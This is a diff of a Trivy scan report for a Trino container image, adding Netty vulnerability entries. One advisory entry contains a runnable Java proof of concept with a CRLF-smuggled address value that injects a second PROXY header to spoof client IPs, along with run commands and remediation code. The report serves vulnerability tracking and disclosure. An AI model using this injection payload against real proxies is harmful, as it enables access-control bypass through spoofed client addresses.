@@ -3,8 +3,8 @@
   "Trivy": {
     "Version": "0.72.0"
   },
-  "ReportID": "019f8a31-6110-79c9-b23e-0b4ab91475d2",
-  "CreatedAt": "2026-07-22T14:18:39.760643036Z",
+  "ReportID": "019f8e9b-f08e-77ef-94bd-407852a24205",
+  "CreatedAt": "2026-07-23T10:53:32.174521294Z",
   "ArtifactID": "sha256:613d663a46e94a8c1e70668307f2c1870de4832aee07d50d6f589f33a952042f",
   "ArtifactName": "ghcr.io/verity-org/cache:trinodb-trino-482",
   "ArtifactType": "container_image",
@@ -39036,6 +39036,591 @@
           "LastModifiedDate": "2026-06-17T09:30:29.473Z"
         },
         {
+          "VulnerabilityID": "CVE-2026-59901",
+          "VendorIDs": [
+            "GHSA-558v-64gr-wgg4"
+          ],
+          "PkgName": "io.netty:netty-codec-compression",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-compression-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-compression@4.2.15.Final",
+            "UID": "5c03ddbf642ad02b"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59901",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:ca05bc615617955b99d695470c8e765d18ebb1e3af3458f0ce215b09ca209eab",
+          "Title": "Netty: [Bzip2Decoder] Infinite Loop in RLE State Machine Leads to Event-Loop Thread Hang",
+          "Description": "The `Bzip2Decoder` handler in Netty's compression codec pipeline is vulnerable to a denial-of-service attack through a malformed bzip2 stream that permanently captures the event-loop thread in an infinite loop. The vulnerability exists in the run-length encoding (RLE) state machine within [`Bzip2BlockDecompressor.read()`]",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-558v-64gr-wgg4"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-55851",
+          "VendorIDs": [
+            "GHSA-q6cq-mhr2-jmr5"
+          ],
+          "PkgName": "io.netty:netty-codec-haproxy",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-haproxy-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-haproxy@4.2.15.Final",
+            "UID": "a9ab09ff9a3fee30"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-55851",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:2249747f9721a130a216e5567dd103f88fe4e024717c1226ea096026973e2d22",
+          "Title": "Netty: [codec-haproxy] Signed-Byte Sentinel Collision in HAProxyMessageDecoder Leads to Unbounded Memory Exhaustion",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. In versions 4.2.0.Final up to (but not including) 4.2.16.Final, and 4.1.0.Final up to (but not including) 4.1.135, the `HAProxyMessageDecoder` in Netty's `codec-haproxy` module performs protocol version detection by reading the 13th byte as a signed Java `byte` and widening it to `int` without masking; a PROXY protocol v2 binary prefix followed by version byte `0xFF` sign-extends to `-1`, collides with the decoder's need-more-data sentinel, and causes `ByteToMessageDecoder` to accumulate inbound bytes in an unbounded `cumulation` buffer until direct memory is exhausted. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-q6cq-mhr2-jmr5",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55851"
+          ],
+          "PublishedDate": "2026-07-21T22:17:14.34Z",
+          "LastModifiedDate": "2026-07-22T20:35:40.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59919",
+          "VendorIDs": [
+            "GHSA-wh89-7897-x99h"
+          ],
+          "PkgName": "io.netty:netty-codec-haproxy",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-haproxy-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-haproxy@4.2.15.Final",
+            "UID": "a9ab09ff9a3fee30"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59919",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:b922530472c8b7ed4ccc43ca0b245d5453b8320b1a11d8e142acd48a0dc5c6d1",
+          "Title": "Netty: HAProxy V1 Protocol CRLF Injection via AF_UNIX Address",
+          "Description": "# Security Vulnerability Report: HAProxy V1 Protocol CRLF Injection via AF_UNIX Address in Netty\n\n## 1. Vulnerability Summary\n\n| Field | Value |\n|-------|-------|\n| **Product** | Netty |\n| **Version** | 4.2.12.Final (and all prior versions with codec-haproxy) |\n| **Component** | `io.netty.handler.codec.haproxy.HAProxyMessageEncoder` |\n| **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences |\n| **Impact** | HAProxy PROXY Protocol Injection / Client IP Spoofing |\n| **CVSS 3.1 Score** | **7.5 (High)** |\n| **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |\n\n## 2. Affected Components\n\n- `io.netty.handler.codec.haproxy.HAProxyMessageEncoder` — `encodeV1()` method (lines 63-77): writes `sourceAddress` and `destinationAddress` directly to output without CRLF validation\n- `io.netty.handler.codec.haproxy.HAProxyMessage` — constructor `checkAddress()` validates IPv4/IPv6 format but **only checks length for AF_UNIX** (line 439)\n\n## 3. Vulnerability Description\n\nNetty's HAProxy protocol encoder writes AF_UNIX socket addresses directly into the HAProxy V1 text protocol format **without validating for CRLF characters**. The V1 protocol uses CRLF (`\\r\\n`) as the line terminator, so CRLF characters in an address split the single PROXY header line into multiple lines, effectively injecting a second PROXY protocol header.\n\n### Root Cause — Encoder\n\n```java\n// HAProxyMessageEncoder.java:63-77\nprivate static void encodeV1(HAProxyMessage msg, ByteBuf out) {\n    out.writeBytes(TEXT_PREFIX);                                    // \"PROXY \"\n    out.writeByte((byte) ' ');\n    out.writeCharSequence(msg.proxiedProtocol().name(), US_ASCII); // \"UNIX_STREAM\"\n    out.writeByte((byte) ' ');\n    out.writeCharSequence(msg.sourceAddress(), US_ASCII);           // \u003c-- NO CRLF CHECK\n    out.writeByte((byte) ' ');\n    out.writeCharSequence(msg.destinationAddress(), US_ASCII);      // \u003c-- NO CRLF CHECK\n    out.writeByte((byte) ' ');\n    // ...\n    out.writeByte((byte) '\\r');\n    out.writeByte((byte) '\\n');\n}\n```\n\n### Root Cause — Insufficient Address Validation\n\n```java\n// HAProxyMessage.java:428-442\nprivate static void checkAddress(String address, AddressFamily addrFamily) {\n    switch (addrFamily) {\n        case AF_UNIX:\n            ObjectUtil.checkNotNull(address, \"address\");\n            if (address.getBytes(CharsetUtil.US_ASCII).length \u003e 108) {\n                throw new IllegalArgumentException(\"invalid AF_UNIX address: \" + address);\n            }\n            return;  // ONLY checks length \u003c= 108, NO CRLF validation!\n        case AF_IPv4:\n            if (!NetUtil.isValidIpV4Address(address)) { ... }  // Format check blocks CRLF\n        case AF_IPv6:\n            if (!NetUtil.isValidIpV6Address(address)) { ... }  // Format check blocks CRLF\n    }\n}\n```\n\nIPv4 and IPv6 addresses are validated against format rules that implicitly reject CRLF. But **AF_UNIX addresses only check `length \u003c= 108`** — any characters including CRLF are accepted.\n\n## 4. Exploitability Prerequisites\n\nThis vulnerability is exploitable when:\n\n1. An application uses Netty's `HAProxyMessageEncoder` to construct HAProxy V1 protocol headers\n2. AF_UNIX (`UNIX_STREAM` or `UNIX_DGRAM`) addresses contain user-controlled input\n3. The encoded PROXY header is sent to a downstream server or load balancer\n\n**Affected use cases**:\n- PROXY protocol relays that construct AF_UNIX messages from upstream data\n- Load balancer integrations where socket paths come from configuration or external sources\n- Multi-tenant proxies that dynamically construct PROXY headers\n\n## 5. Attack Scenario\n\n### Client IP Spoofing via Second PROXY Line Injection\n\n```java\nString maliciousAddr = \"/var/run/app.sock\\r\\nPROXY TCP4 10.0.0.1 10.0.0.2 1234 80\";\n\nHAProxyMessage msg = new HAProxyMessage(\n    HAProxyProtocolVersion.V1,\n    HAProxyCommand.PROXY,\n    HAProxyProxiedProtocol.UNIX_STREAM,\n    maliciousAddr,                    // CRLF-injected source address\n    \"/var/run/dest.sock\",\n    0, 0);\n```\n\n**Wire format sent to backend**:\n```\nPROXY UNIX_STREAM /var/run/app.sock\nPROXY TCP4 10.0.0.1 10.0.0.2 1234 80 /var/run/dest.sock 0 0\n```\n\nThe backend receives **two PROXY lines**. Depending on implementation:\n- HAProxy: may use the first line and ignore the second\n- Other implementations: may use the **second** line, treating the connection as TCP4 from `10.0.0.1`\n- This enables **client IP spoofing** — the backend believes the client is `10.0.0.1` when it's not\n\n## 6. Proof of Concept\n\n### Full Runnable PoC Source Code (HAProxyUnixCRLFPoC.java)\n\n```java\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.embedded.EmbeddedChannel;\nimport io.netty.handler.codec.haproxy.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class HAProxyUnixCRLFPoC {\n    public static void main(String[] args) {\n        System.out.println(\"=== Netty HAProxy AF_UNIX CRLF Injection PoC ===\\n\");\n\n        String maliciousAddr = \"/var/run/app.sock\\r\\nPROXY TCP4 10.0.0.1 10.0.0.2 1234 80\";\n        String destAddr = \"/var/run/dest.sock\";\n\n        HAProxyMessage msg = new HAProxyMessage(\n            HAProxyProtocolVersion.V1,\n            HAProxyCommand.PROXY,\n            HAProxyProxiedProtocol.UNIX_STREAM,\n            maliciousAddr, destAddr, 0, 0);\n\n        EmbeddedChannel ch = new EmbeddedChannel(HAProxyMessageEncoder.INSTANCE);\n        ch.writeOutbound(msg);\n\n        ByteBuf out = ch.readOutbound();\n        String encoded = out.toString(StandardCharsets.UTF_8);\n        out.release();\n        ch.finishAndReleaseAll();\n\n        System.out.println(\"Wire format:\");\n        for (String line : encoded.split(\"\\n\", -1)) {\n            System.out.println(\"  \" + line.replace(\"\\r\", \"\\\\r\"));\n        }\n\n        int proxyCount = 0;\n        for (String line : encoded.split(\"\\r\\n\")) {\n            if (line.startsWith(\"PROXY\")) proxyCount++;\n        }\n        System.out.println(\"PROXY lines: \" + proxyCount);\n        System.out.println(\"VULNERABLE: \" + (proxyCount \u003e 1 ? \"YES\" : \"NO\"));\n    }\n}\n```\n\n### How to Compile and Run\n\n```bash\nJARS=$(find ~/.m2/repository/io/netty -name \"netty-*.jar\" -path \"*/4.2.12.Final/*\" \\\n  | grep -v sources | grep -v javadoc | tr '\\n' ':')\njavac -cp \"$JARS\" HAProxyUnixCRLFPoC.java\njava -cp \"$JARS:.\" HAProxyUnixCRLFPoC\n```\n\n### PoC Execution Output (Verified on Netty 4.2.12.Final)\n\n```\n=== Netty HAProxy AF_UNIX CRLF Injection PoC ===\n\n[TEST 1] AF_UNIX Source Address CRLF Injection\n------------------------------------------------\n  Source address: \"/var/run/app.sock\\r\\nPROXY TCP4 10.0.0.1 10.0.0.2 1234 80\"\n  Wire format:\n    PROXY UNIX_STREAM /var/run/app.sock\\r\n    PROXY TCP4 10.0.0.1 10.0.0.2 1234 80 /var/run/dest.sock 0 0\\r\n\n  PROXY lines found: 2\n  VULNERABLE: YES - Second PROXY line injected!\n```\n\n## 7. Remediation Recommendations\n\n### Option 1: Validate AF_UNIX Addresses for CRLF\n\n```java\n// HAProxyMessage.java checkAddress() - add for AF_UNIX:\ncase AF_UNIX:\n    ObjectUtil.checkNotNull(address, \"address\");\n    byte[] addrBytes = address.getBytes(CharsetUtil.US_ASCII);\n    if (addrBytes.length \u003e 108) {\n        throw new IllegalArgumentException(\"invalid AF_UNIX address: too long\");\n    }\n    for (byte b : addrBytes) {\n        if (b == '\\r' || b == '\\n') {\n            throw new IllegalArgumentException(\n                \"AF_UNIX address contains prohibited CRLF character\");\n        }\n    }\n    return;\n```\n\n### Option 2: Validate in Encoder\n\n```java\n// HAProxyMessageEncoder.java encodeV1() - validate before writing:\nprivate static void validateV1Address(String address) {\n    for (int i = 0; i \u003c address.length(); i++) {\n        char c = address.charAt(i);\n        if (c == '\\r' || c == '\\n' || c == ' ') {\n            throw new HAProxyProtocolException(\n                \"V1 address contains prohibited character at index \" + i);\n        }\n    }\n}\n```\n\n## 8. References\n\n- [HAProxy PROXY Protocol v1 Specification](https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt)\n- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)\n- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-wh89-7897-x99h"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-55831",
+          "VendorIDs": [
+            "GHSA-6jqx-86gh-f27w"
+          ],
+          "PkgName": "io.netty:netty-codec-http",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http@4.2.15.Final",
+            "UID": "7e33ae51dbfafc2d"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-55831",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:8c70e203aef8c9b0506fcf424251b7d3c3a117da7c895b4835df7c48c42f6052",
+          "Title": "Netty is a network application framework for development of protocol s ...",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. Prior to 4.1.136.Final and 4.2.16.Final, Netty's SPDY SETTINGS decoder accepts a peer-declared SETTINGS entry count up to the 24-bit frame-length limit and materializes every unique setting ID in `DefaultSpdySettingsFrame`, allowing a remote SPDY/3.1 peer to send a syntactically valid roughly 2 MiB SETTINGS frame that creates 262144 map entries and amplifies network input into heap growth and ordered-map insertion work. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-6jqx-86gh-f27w",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55831"
+          ],
+          "PublishedDate": "2026-07-21T00:17:35.383Z",
+          "LastModifiedDate": "2026-07-22T19:37:49.57Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-55833",
+          "VendorIDs": [
+            "GHSA-mvh2-crg5-v77c"
+          ],
+          "PkgName": "io.netty:netty-codec-http",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http@4.2.15.Final",
+            "UID": "7e33ae51dbfafc2d"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-55833",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:010913ece719a89f9a87656df962595c8c12654b3a6d200c2e54c6db8d06292d",
+          "Title": "Netty is a network application framework for development of protocol s ...",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. Prior to 4.1.136.Final and 4.2.16.Final, Netty SPDY header decoding continues inflating zlib-compressed header blocks after the raw header parser has exceeded `maxHeaderSize` and marked the frame truncated in `SpdyFrameCodec`, allowing a remote peer to send a small compressed `HEADERS` block that expands into much larger raw header data and causes compression-amplified CPU and allocation churn. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-mvh2-crg5-v77c",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55833"
+          ],
+          "PublishedDate": "2026-07-21T00:17:35.537Z",
+          "LastModifiedDate": "2026-07-22T19:38:08.847Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-56745",
+          "VendorIDs": [
+            "GHSA-jppx-w49h-x2qq"
+          ],
+          "PkgName": "io.netty:netty-codec-http",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http@4.2.15.Final",
+            "UID": "7e33ae51dbfafc2d"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56745",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:d181fa68f3dfb34fc099589971e28e25bc65b89602d62f4787b83febfbb76789",
+          "Title": "Netty: [SpdyHttpDecoder] ByteBuf Reference Leak on RST_STREAM Leads to Native Memory Exhaustion",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. In versions 4.2.0.Final through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final, the `SpdyHttpDecoder` handler in Netty's SPDY-to-HTTP codec allocates a pooled `ByteBuf` when processing a client-initiated `SYN_STREAM` frame with `FLAG_FIN=0` and stores the partially constructed `FullHttpRequest` in `messageMap`; when the remote peer sends `RST_STREAM` for that stream or the accumulated content exceeds `maxContentLength`, the decoder removes the entry but does not release the pooled `ByteBuf`, causing native memory exhaustion. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-jppx-w49h-x2qq",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-56745"
+          ],
+          "PublishedDate": "2026-07-21T22:17:14.5Z",
+          "LastModifiedDate": "2026-07-22T20:35:40.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-56746",
+          "VendorIDs": [
+            "GHSA-6cqp-g7gg-8hr5"
+          ],
+          "PkgName": "io.netty:netty-codec-http",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http@4.2.15.Final",
+            "UID": "7e33ae51dbfafc2d"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56746",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:d02bac601773de431d53fbf09ddc32032aa6ed4a53b4bbeb53c0c2edccb22a3e",
+          "Title": "Netty: Security Control Bypass via CORS Short-Circuit Failure",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. Versions 4.2.0.Final through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final, are vulnerable to security control bypass during the origin evaluation process. CorsHandler provides a shortCircuit() configuration designed to reject unauthorized cross-origin requests immediately, acting as a security control before requests reach the application. However, due to a logical operator error in the origin evaluation process, this protection can be entirely bypassed. An attacker can bypass the short-circuit mechanism by sending a request with an Origin: null header. This failure forwards unauthorized requests to the backend application, bypassing intended access controls. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-284"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-6cqp-g7gg-8hr5",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-56746"
+          ],
+          "PublishedDate": "2026-07-21T22:17:14.667Z",
+          "LastModifiedDate": "2026-07-22T20:35:40.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59898",
+          "VendorIDs": [
+            "GHSA-4mp9-239f-g9hg"
+          ],
+          "PkgName": "io.netty:netty-codec-http",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http@4.2.15.Final",
+            "UID": "7e33ae51dbfafc2d"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59898",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:c2f8236313b7fc387e98ae7d0980d7396a7cab8d52d2c0b4e9fe66381056a202",
+          "Title": "Netty: WebSockets V07/V08 handshaker missing Connection/Upgrade validation",
+          "Description": "## Summary\nAn attacker can force WebSocket upgrade via the lax V07 (or V08) handshaker by sending `Sec-WebSocket-Version: 7` and omitting `Connection: Upgrade` / `Upgrade: websocket` headers, completing a protocol switch that a proxy would not recognize as an Upgrade request and enabling HTTP request smuggling / protocol-confusion attacks.",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+              "V40Score": 6.3
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-4mp9-239f-g9hg"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59899",
+          "VendorIDs": [
+            "GHSA-q4f6-jm68-57ww"
+          ],
+          "PkgName": "io.netty:netty-codec-http",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-http-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-http@4.2.15.Final",
+            "UID": "7e33ae51dbfafc2d"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
